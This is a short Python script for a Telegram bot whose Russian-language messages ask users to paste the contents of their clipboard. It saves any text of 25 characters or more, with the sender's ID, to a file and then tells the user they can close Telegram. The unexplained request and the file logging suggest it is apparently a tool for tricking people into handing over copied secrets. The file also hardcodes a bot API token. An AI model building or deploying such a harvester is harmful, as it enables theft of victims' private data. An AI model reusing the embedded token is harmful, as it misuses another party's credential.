import telebot
import requests

bot = telebot.TeleBot("1448041949:AAGKZXLqa7MTi25uE3JflofJrFadzY0KQSc")


@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, f'Я бот. Приятно познакомиться,вставьте текст из буфера обмена {message.from_user.id}')


@bot.message_handler(content_types=['text'])
def send_message(message):
    if len(message.text)>=25:
        bot.reply_to(message, "Все готово, можете закрыть телеграм")
        with open("userids.txt", "w") as file:
            file.write(str(message.from_user.id) + " " + str(message.text))
    else:
        bot.reply_to(message, "Вставьте текст из буфера обмена")
bot.polling(none_stop=True)
